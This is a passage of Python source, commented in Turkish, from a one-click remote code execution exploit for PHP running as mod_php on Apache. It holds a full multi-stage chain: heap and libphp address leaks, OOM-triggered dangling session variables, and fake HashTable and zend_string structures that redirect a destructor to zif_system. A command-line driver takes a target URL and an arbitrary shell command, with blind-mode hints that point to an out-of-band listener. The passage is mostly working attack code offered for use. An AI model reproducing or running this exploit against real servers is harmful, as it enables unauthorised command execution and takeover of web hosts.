        struct.pack_into("<II", ht, 0x18, 1, 1)                 # nNumUsed/OfElements
        struct.pack_into("<II", ht, 0x20, 8, 0)                 # nTableSize/pointer
        struct.pack_into("<Q", ht, 0x28, 0)                     # nNextFreeElement
        struct.pack_into("<Q", ht, 0x30, zif)                   # pDestructor
        # data+0x20 konumunda sahte execute_data
        E = 0x20
        struct.pack_into("<Q", ht, E + 0x00, 0)                 # opline
        struct.pack_into("<Q", ht, E + 0x08, 0)                 # call
        struct.pack_into("<Q", ht, E + 0x10, zif)               # return_value
        struct.pack_into("<Q", ht, E + 0x18, 0)                 # func
        struct.pack_into("<Q", ht, E + 0x20, 0)                 # This.value
        struct.pack_into("<I", ht, E + 0x28, 0)                 # This.u1.type_info
        struct.pack_into("<I", ht, E + 0x2C, 1)                 # num_args = 1
        struct.pack_into("<Q", ht, E + 0x30, 0)                 # prev_execute_data
        struct.pack_into("<Q", ht, E + 0x38, 0)                 # symbol_table
        struct.pack_into("<I", ht, E + 0x40, 0)                 # call_info
        struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)     # arg1 değeri
        struct.pack_into("<I", ht, E + 0x58, 6)                 # arg1 IS_STRING
        # data+0x80 konumunda sahte zend_string
        struct.pack_into("<II", ht, 0x80, 1, 0x106)             # gc rc=1, IS_STRING
        struct.pack_into("<Q", ht, 0x88, 0)                     # h
        struct.pack_into("<Q", ht, 0x90, len(cmd))              # len
        ht[0x98:0x98 + len(cmd)] = cmd
        ht[0x98 + len(cmd)] = 0

        # R0-0x10 konumuna yerleştirilen sahte referans (55 byte)
        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)               # IS_REFERENCE
        struct.pack_into("<Q", ref, 0x18, htdata)               # val.value
        struct.pack_into("<Q", ref, 0x20, 0x307)                # IS_ARRAY_EX
        struct.pack_into("<Q", ref, 0x28, 0)                    # sources
        return bytes(ht), bytes(ref)

    def stage3(self, htdata: int, zif: int) -> None:
        """Sahte referansı PS(http_session_vars) üzerine yaz ve çalıştır."""
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        specs = self.stage3_pads
        for i, (nl, vl) in enumerate(specs):
            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
            parts.append({"name": name, "data": b"V" * vl})
        parts += [self._file_part(), self._big_field()]
        extra = None
        if self.profile == "bookworm":
            # PS(id) geçerli kalsın: php_session_initialize böylece
            # send_cookie=0'da kalır; B'nin başlatması R0+16'daki Set-Cookie
            # başlığını ayırmaz (o, val.type'ı ezerdi).
            extra = {"Cookie": "PHPSESSID=" + "a" * 32}
        self.t.post(build_multipart(parts, b"S" * 17), b"S" * 17,
                    read_cap=1 << 20, timeout=max(90.0, self.t.timeout),
                    extra_headers=extra)
        time.sleep(0.3)

        ht, ref = self._fake_payload(htdata, zif)
        parts = [
            {"name": "PHPSESSID", "data": SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        if self.stage3_carrier:
            # bookworm referansı hâlâ canlı (rc=2).  15 byte'lık bin-40
            # zend_string karakterlerini tam PS(http_session_vars)'e oturtur:
            # gc'yi koru (rc=1, IS_REFERENCE), val.value'nun düşük 7 byte'ını
            # sahte HashTable'a yeniden yaz, yüksek byte 0x00 kalsın
            # (kanonik 0x00007f... işaretçisi).
            carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
            parts.append({"name": "g00", "data": carrier})
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
        else:
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": ht})
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": ref})
        self.t.post(build_multipart(parts, b"B" * 10), b"B" * 10,
                    read_cap=65536, timeout=30.0)

    # ----------------------------- pure zinciri ------------------------------

    def pure_a1(self, big: int, parts: int, chunked: bool = True) -> None:
        """A1: END-cleanup send_cookie OOM (chunked TE post_max_size'ı atlar)."""
        body = build_a1_body(parts=parts, big=big)
        if self.debug_http:
            self.t.log(f"[DBG] A1 gövde boyutu: {len(body)} byte ({len(body)/1024/1024:.1f} MB)")
        resp = self.t.post(body, PURE_BOUNDARY, read_cap=1 << 20, timeout=300.0,
                    chunked=chunked, query=Q)
        if self.debug_http and resp:
            hdr_end = resp.find(b"\r\n\r\n")
            if hdr_end > 0:
                self.t.log(f"[DBG] A1 HTTP yanıt:\n{resp[:hdr_end].decode('latin1', 'replace')}")
            sci = resp.lower().find(b"set-cookie:")
            if sci >= 0:
                self.t.log("[DBG] A1 Set-Cookie bulundu")
            else:
                self.t.log("[DBG] A1 yanıtında Set-Cookie YOK")

    def pure_b1(self, leak_cfg: dict, chunked: bool = True) -> dict | None:
        """B1: bayat-id OOB okuma -> tek yanıtta {lib, main_candidates}."""
        body = build_leak_body(leak_cfg["spec"], leak_cfg["fake_len"])
        resp = self.t.post(body, PURE_BOUNDARY, read_cap=9 << 20, timeout=600.0,
                           chunked=chunked)
        if self.debug_http:
            self.t.log(f"[DBG] B1 yanıt boyutu: {len(resp)} byte")
            hdr_end = resp.find(b"\r\n\r\n")
            if hdr_end > 0:
                self.t.log(f"[DBG] B1 HTTP başlıkları:\n{resp[:hdr_end].decode('latin1', 'replace')}")
            else:
                self.t.log(f"[DBG] B1 yanıt (ilk 500B): {resp[:500]}")
            low = resp.lower()
            sci = low.find(b"set-cookie:")
            if sci >= 0:
                cookie_line = resp[sci:sci+300].split(b"\r\n")[0]
                self.t.log(f"[DBG] B1 Set-Cookie bulundu: {cookie_line[:200]}")
            else:
                self.t.log("[DBG] B1 yanıtında Set-Cookie YOK")
            phpsid = low.find(b"phpsessid")
            if phpsid >= 0:
                self.t.log(f"[DBG] B1 PHPSESSID bulundu offset={phpsid}")
            else:
                self.t.log("[DBG] B1 yanıtında PHPSESSID YOK")
        return parse_leak_pure(resp, self.pure_zdtor, leak_cfg["main_count"])

    def pure_a2(self, fillers: int = PURE_FILLERS) -> None:
        """A2: ucuz-OOM -> sarkan PS(http_session_vars)."""
        body = build_cheap_oom_body(fillers=fillers)
        self.t.post(body, PURE_BOUNDARY, read_cap=1 << 20, timeout=120.0)

    def pure_b2(self, S: int, zif: int) -> None:
        """B2: sahte referans spreyi + sahte zend_array -> pDestructor=zif_system."""
        ht = build_ht_384(S, zif, self.cmd)
        body = build_fake_ref_body(vl=384, n1=500, n2=495, ptr=S, ht=ht)
        self.t.post(body, PURE_BOUNDARY, read_cap=1 << 20, timeout=120.0)


def pick_oom_config(limit_mb: int | None) -> dict:
    if limit_mb is None:
        return OOM_CONFIGS[2]  # 128M varsayılan
    for cfg in OOM_CONFIGS:
        if cfg["limit_mb"] == limit_mb:
            return cfg
    # en yakın üst değer, yoksa en büyüğü
    above = [c for c in OOM_CONFIGS if c["limit_mb"] >= limit_mb]
    return above[0] if above else OOM_CONFIGS[-1]


def check_proof(t: Target, proof_file: str, fetch: str) -> str:
    if proof_file:
        try:
            if os.path.exists(proof_file):
                with open(proof_file, "rb") as f:
                    return f.read().decode("latin1").strip()
        except OSError:
            pass
    if fetch:
        status, body = t.get(fetch)
        if status == 200:
            return body.decode("latin1").strip()
    return ""


def run_classic(args, t: Target, ex: Exploit) -> bool:
    t.log("[*] zincir: classic (display_errors=1, memory_limit=8M)")

    def rotate_after_failure() -> None:
        if not args.no_retry_rotate:
            ex.rotate()

    if not args.no_pre_rotate:
        ex.rotate()

    # ---- aşama 1 ----
    chunk = 0
    for attempt in range(1, args.retries + 1):
        t.log(f"[*] aşama 1: heap sızıntısı (deneme {attempt}/{args.retries})")
        chunk = ex.stage1()
        if chunk:
            t.log(f"[+] chunk tabanı = 0x{chunk:x}")
            break
        t.log("[-] heap sızıntısı ıskalandı")
        rotate_after_failure()
    if not chunk:
        print("HEAP_LEAK_FAILED", file=sys.stderr)
        return False
    ex.rotate()  # her aşamanın taze worker'a ihtiyacı var

    # ---- aşama 2 ----
    libphp = 0
    for attempt in range(1, args.retries + 1):
        t.log(f"[*] aşama 2: libphp sızıntısı (deneme {attempt}/{args.retries})")
        libphp = ex.stage2()
        if libphp:
            t.log(f"[+] libphp tabanı = 0x{libphp:x}")
            break
        t.log("[-] libphp sızıntısı ıskalandı")
        rotate_after_failure()
    if not libphp:
        print("LIBPHP_LEAK_FAILED", file=sys.stderr)
        return False
    ex.rotate()

    # ---- aşama 3 ----
    htdata = chunk + args.htdata_offset
    zif = libphp + args.zif_offset
    t.log(f"[*] aşama 3: HTDATA=0x{htdata:x} ZIF=0x{zif:x}")
    if args.proof_file:
        try:
            if os.path.exists(args.proof_file):
                os.unlink(args.proof_file)
        except OSError:
            pass

    for attempt in range(1, args.retries + 3):
        try:
            ex.stage3(htdata, zif)
        except OSError as e:
            t.log(f"[-] istek hatası: {e}")
        time.sleep(0.8)

        proof = check_proof(t, args.proof_file, args.fetch)
        if proof:
            t.log(f"[+] classic aşama 3 deneme {attempt}")
            print(f"PROOF: {proof}")
            return True
        t.log(f"[-] aşama 3 deneme {attempt}: kanıt yok")
        rotate_after_failure()

    print("CLASSIC_EXPLOIT_FAILED (kanıt yok; komut kör olarak çalışmış olabilir)",
          file=sys.stderr)
    return False


def run_pure(args, t: Target, ex: Exploit) -> bool:
    oom = pick_oom_config(args.memory_limit)
    if args.oom_big:
        oom = {"limit_mb": args.memory_limit or 0, "big": args.oom_big,
               "parts": args.oom_parts or 860, "label": "özel"}
    leak_cfg = LEAK_SPECS[args.leak_size]
    t.log("[*] zincir: pure (display_errors=Off, chunked TE ile post_max_size atlaması)")
    t.log(f"[*] OOM yapılandırması: big={oom['big']} parts={oom['parts']} "
          f"(memory_limit {oom.get('label', '?')}), sızıntı: {leak_cfg['label']}")
    if len(ex.cmd) > MAX_CMD_PURE:
        print(f"komut {len(ex.cmd)} byte; pure 384 byte'lık taşıyıcı en fazla "
              f"{MAX_CMD_PURE} byte izin verir", file=sys.stderr)
        return False

    if args.proof_file:
        try:
            if os.path.exists(args.proof_file):
                os.unlink(args.proof_file)
        except OSError:
            pass

    chunked = not args.no_chunked

    for attempt in range(1, args.retries + 1):
        t.log(f"[*] pure denemesi {attempt}/{args.retries}")
        # Her tam zincir geçişi için taze worker (9bie'nin docker restart'ını,
        # uzakta da çalışan HTTP rotasyonuyla değiştirir).
        ex.rotate()

        # A1 + B1 AYNI worker'a düşmeli: arada rotate yok.
        t.log("[*] A1: END-cleanup send_cookie OOM (chunked)")
        ex.pure_a1(oom["big"], oom["parts"], chunked=chunked)
        time.sleep(0.3)

        t.log("[*] B1: bayat-id OOB okuma (tek atımlık çift sızıntı)")
        info = None
        try:
            info = ex.pure_b1(leak_cfg, chunked=chunked)
        except OSError as e:
            t.log(f"[-] B1 istek hatası: {e}")
        if not info or not info["main_candidates"]:
            t.log("[-] sızıntı ıkalandı (Set-Cookie penceresi / aday yok)")
            continue
        t.log(f"[+] decoded={info['decoded']}B zval_ptr_dtor=0x{info['zdtor']:x} "
              f"(x{info['zdtor_count']}) -> libphp=0x{info['lib']:x}")
        t.log(f"[+] chunk bucket'ları: "
              f"{[(hex(b), c) for b, c in info['buckets'].most_common(4)]}")

        main = info["main_candidates"][0]
        delta = info["lib"] - main
        if not (PURE_DELTA_MIN <= delta <= PURE_DELTA_MAX):
            t.log(f"[-] tutarsız libphp-main deltası 0x{delta:x}; tekrar deneniyor")
            continue

        zif = info["lib"] + ex.pure_zif
        for cand in info["main_candidates"]:
            S = cand + ex.pure_s_offset
            t.log(f"[*] A2+B2: main=0x{cand:x} S=0x{S:x} zif_system=0x{zif:x}")
            t.log("[*] A2: ucuz-OOM -> sarkan PS(http_session_vars)")
            ex.pure_a2(fillers=args.pure_fillers)
            time.sleep(0.3)
            t.log("[*] B2: sahte-referans spreyi + 384B sahte zend_array")
            ex.pure_b2(S, zif)
            time.sleep(0.8)

            proof = check_proof(t, args.proof_file, args.fetch)
            if proof:
                t.log(f"[+] pure zinciri RCE OK (aday main=0x{cand:x})")
                print(f"PROOF: {proof}")
                return True
            t.log(f"[-] aday 0x{cand:x}: kanıt henüz yok")
            if not args.proof_file and not args.fetch:
                # kör mod: worker canlılığını zayıf sinyal olarak yokla
                try:
                    status, _ = t.get(t.path, read_cap=4096)
                    t.log(f"[*] B2 sonrası worker durumu: {status} "
                          "(kör komut çalışmış olabilir; OOB dinleyicinizi kontrol edin)")
                except OSError:
                    t.log("[*] B2 sonrası worker'a erişilemiyor (çöküş/RCE göstergesi)")

    print("PURE_EXPLOIT_FAILED (kanıt yok; komut kör olarak çalışmış olabilir)",
          file=sys.stderr)
    return False


def main() -> int:
    ap = argparse.ArgumentParser(
        description="php2shell tek-tık exploit — hsyncomtr çift zincir sürümü "
                    "(classic: display_errors=1/8M | pure: display_errors=Off/128M+, "
                    "chunked-TE post_max_size atlaması, 200 byte komutlar)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    ap.add_argument("-u", "--url", required=True,
                    help="hedef PHP sayfası, örn. http://127.0.0.1:8088/index.php")
    ap.add_argument("-c", "--cmd", default=DEFAULT_CMD,
                    help=f"çalıştırılacak komut (classic en fazla {MAX_CMD}B, pure {MAX_CMD_PURE}B)")
    ap.add_argument("--proof-file", default=DEFAULT_PROOF,
                    help="sömürü sonrası okunacak yerel kanıt dosyası; '' kapatır")
    ap.add_argument("--fetch", default="",
                    help="sonrasında GET ile çekilecek yol (webroot'a yazan komutlar için)")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), default=None,
                    help=f"libphp.so içinde zif_system ofseti (varsayılan: offsets dosyası veya 0x{ZIF_OFFSET:x})")
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=None,
                    help=f"libphp.so içinde ZVAL_PTR_DTOR ofseti (varsayılan: offsets dosyası veya 0x{DTOR_OFFSET:x})")
    ap.add_argument("--profile", choices=("lab", "bookworm"), default="bookworm",
                    help="classic-zincir derleme profili: bookworm (resmi imaj, varsayılan) veya lab (Apache 2.4.68)")
    ap.add_argument("--htdata-offset", type=lambda x: int(x, 0), default=None,
                    help="167 byte'lık canlı string'in chunk'a göreli ofseti")
    ap.add_argument("--offsets-file", default=DEFAULT_OFFSETS,
                    help="libphp offsetlerini bu dosyadan oku ('' kapatır)")
    ap.add_argument("--docker-container", default="php2shell-target",
                    help="localhost'ta offsetleri otomatik türetmek için kullanılan konteyner")
    ap.add_argument("--no-auto-offsets", action="store_true",
                    help="docker/offsets.py'yi asla otomatik çalıştırma")
    ap.add_argument("--huge-mb", type=int, default=12,
                    help="classic OOM alanının MB cinsinden boyutu; memory_limit'i aşmalı")
    ap.add_argument("--timeout", type=float, default=30.0, help="istek başına zaman aşımı")
    ap.add_argument("--no-pre-rotate", action="store_true",
                    help="başlangıç worker rotasyonunu atla")
    ap.add_argument("--no-retry-rotate", action="store_true",
                    help="başarısız aşama denemeleri arasında rotasyon yapma")
    ap.add_argument("--retries", type=int, default=3,
                    help="zincir başına deneme sayısı; classic aşama 3 retries+2 kullanır")
    ap.add_argument("-q", "--quiet", action="store_true")
    ap.add_argument("--debug-http", action="store_true",
                    help="A1/B1 aşamalarında HTTP yanıt başlıklarını, Set-Cookie ve "
                         "PHPSESSID durumunu logla (sorun giderme için)")
    # ---- pure zincir seçenekleri ----
    ap.add_argument("--chain", choices=("classic", "pure", "auto"), default="auto",
                    help="exploit zinciri: classic (hızlı, display_errors=1), "
                         "pure (üretim, display_errors=Off), auto (önce classic dener, "
                         "düşer; uzun komut veya memory_limit>8 için pure'u dayatır)")
    ap.add_argument("--memory-limit", type=int, default=None,
                    metavar="MB", help="hedef memory_limit (MB) (8/32/64/128/256/512); "
                    "pure OOM payload boyutunu seçer (varsayılan: 128)")
    ap.add_argument("--oom-big", type=int, default=0,
                    help="A1 büyük-değer sayısını elle geçersiz kıl (manuel kalibrasyon)")
    ap.add_argument("--oom-parts", type=int, default=0,
                    help="A1 iç-içe-parça sayısını elle geçersiz kıl (manuel kalibrasyon)")
    ap.add_argument("--leak-size", choices=("big", "small", "micro", "nano"), default="big",
                    help="B1 OOB okuma boyutu: big=800KB, small=256KB, micro=128KB (~6MB), nano=64KB (~2.4MB)")
    ap.add_argument("--no-chunked", action="store_true",
                    help="A1/B1'i chunked TE yerine Content-Length ile gönder "
                         "(yalnızca ön uç Transfer-Encoding'i söküyorssa kullan)")
    ap.add_argument("--pure-fillers", type=int, default=PURE_FILLERS,
                    help="A2 heap şekillendirme için ucuz-OOM dolgu sayısı")
    ap.add_argument("--pure-zdtor", type=lambda x: int(x, 0), default=None,
                    help=f"pure sızıntı için zval_ptr_dtor ofseti (varsayılan 0x{PURE_ZDTOR_OFFSET:x})")
    ap.add_argument("--pure-zif", type=lambda x: int(x, 0), default=None,
                    help=f"pure zinciri için zif_system ofseti (varsayılan 0x{PURE_ZIF_OFFSET:x})")
    ap.add_argument("--pure-s-offset", type=lambda x: int(x, 0), default=None,
                    help=f"ana chunk içinde sahte-dizi S ofseti (varsayılan 0x{PURE_S_OFFSET:x})")
    ap.add_argument("--probe-only", action="store_true",
                    help="hedefin parmak izini al ve çık")
    ap.add_argument("--insecure-tls", action="store_true",
                    help="TLS sertifika doğrulamasını atla (self-signed hedefler)")
    args = ap.parse_args()

    cmd_len = len(args.cmd.encode())

    if args.htdata_offset is None:
        args.htdata_offset = (BOOKWORM_HTDATA_OFFSET if args.profile == "bookworm"
                              else HTDATA_OFFSET)

    local_offsets = read_offsets_file(args.offsets_file)
    t = Target(args.url, timeout=args.timeout, verbose=not args.quiet,
               insecure_tls=args.insecure_tls)

    # ---- probe (her zaman): banner + PHP sürümü + mod_php ipucu --------------
    info = t.probe()
    t.log(f"[*] hedef {args.url} (komut={args.cmd!r}, {cmd_len}B)")
    t.log(f"[*] probe: erişilebilir={info.get('reachable')} "
          f"sunucu={info.get('server', '?')} php={info.get('php_version', 'yok')} "
          f"mod_php={info.get('likely_mod_php', '?')}")
    if not info.get("reachable"):
        print("TARGET_UNREACHABLE", file=sys.stderr)
        return 2
    if info.get("likely_mod_php") is False:
        t.log("[!] hedef Apache gibi görünmüyor; exploit mod_php prefork gerektirir")
    if args.probe_only:
        return 0

    # Yerel bir docker hedefi, lab'dan farklı imaj/araç zincirinden derlenmiş
    # olabilir; konteynere gerçek libphp offsetlerini bir kez sor.
    if (not local_offsets and not args.no_auto_offsets and args.offsets_file
            and t.host in ("127.0.0.1", "localhost", "::1")):
        helper = os.path.join(_HERE, "docker", "offsets.py")
        if os.path.exists(helper):
            if not args.quiet:
                print(f"[*] offsets dosyası yok; libphp sembolleri "
                      f"{args.docker_container} konteynerinden okunuyor", flush=True)
            try:
                subprocess.run(
                    [sys.executable, helper, args.docker_container, args.offsets_file],
                    check=False, timeout=60,
                    stdout=None if not args.quiet else subprocess.DEVNULL,
                    stderr=None if not args.quiet else subprocess.DEVNULL,
                )
            except (OSError, subprocess.SubprocessError):
                pass
            local_offsets = read_offsets_file(args.offsets_file)

    if args.zif_offset is None:
        args.zif_offset = local_offsets.get("ZIF_OFFSET", ZIF_OFFSET)
    if args.dtor_offset is None:
        args.dtor_offset = local_offsets.get("DTOR_OFFSET", DTOR_OFFSET)
    if args.pure_zdtor is None:
        args.pure_zdtor = local_offsets.get("PURE_ZDTOR_OFFSET", PURE_ZDTOR_OFFSET)
    if args.pure_zif is None:
        args.pure_zif = local_offsets.get("PURE_ZIF_OFFSET", PURE_ZIF_OFFSET)
    if args.pure_s_offset is None:
        args.pure_s_offset = local_offsets.get("PURE_S_OFFSET", PURE_S_OFFSET)

    # ---- zincir seçimi --------------------------------------------------
    chain = args.chain
    if chain == "auto":
        if args.memory_limit is not None and args.memory_limit > 8:
            chain = "pure"
            t.log(f"[*] otomatik: memory_limit={args.memory_limit}M > 8M -> pure zinciri")
        elif cmd_len > MAX_CMD:
            chain = "pure"
            t.log(f"[*] otomatik: komut {cmd_len}B > {MAX_CMD}B -> pure zinciri "
                  f"({MAX_CMD_PURE}B taşıyıcı)")
        else:
            chain = "classic"
    if chain == "classic" and cmd_len > MAX_CMD:
        ap.error(f"--cmd, classic 167 byte taşıyıcıda en fazla {MAX_CMD} byte olabilir; "
                 f"--chain pure (en fazla {MAX_CMD_PURE} byte) veya 'sh</out/c' gibi "
                 f"kısa bir tetikleyici kullanın")
    if chain == "pure" and cmd_len > MAX_CMD_PURE:
        ap.error(f"--cmd, pure 384 byte taşıyıcıda en fazla {MAX_CMD_PURE} byte olabilir")

    ex = Exploit(t, args.cmd, zif_offset=args.zif_offset,
                 dtor_offset=args.dtor_offset, htdata_offset=args.htdata_offset,
                 huge_mb=args.huge_mb, verbose=not args.quiet, profile=args.profile,
                 pure_zdtor=args.pure_zdtor, pure_zif=args.pure_zif,
                 pure_s_offset=args.pure_s_offset,
                 debug_http=args.debug_http)
    t.log(f"[*] offsetler: zif=0x{args.zif_offset:x} dtor=0x{args.dtor_offset:x} "
          f"htdata=0x{args.htdata_offset:x} | pure: zdtor=0x{args.pure_zdtor:x} "
          f"zif=0x{args.pure_zif:x} S=0x{args.pure_s_offset:x}")

    if chain == "classic":
        ok = run_classic(args, t, ex)
        if ok:
            return 0
        if args.chain == "auto":
            t.log("[*] otomatik düşüş: classic zinciri başarısız; pure zinciri "
                  "deneniyor (display_errors=Off / daha yüksek memory_limit)")
            chain = "pure"
        else:
            return 1

    if chain == "pure":
        return 0 if run_pure(args, t, ex) else 1

    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
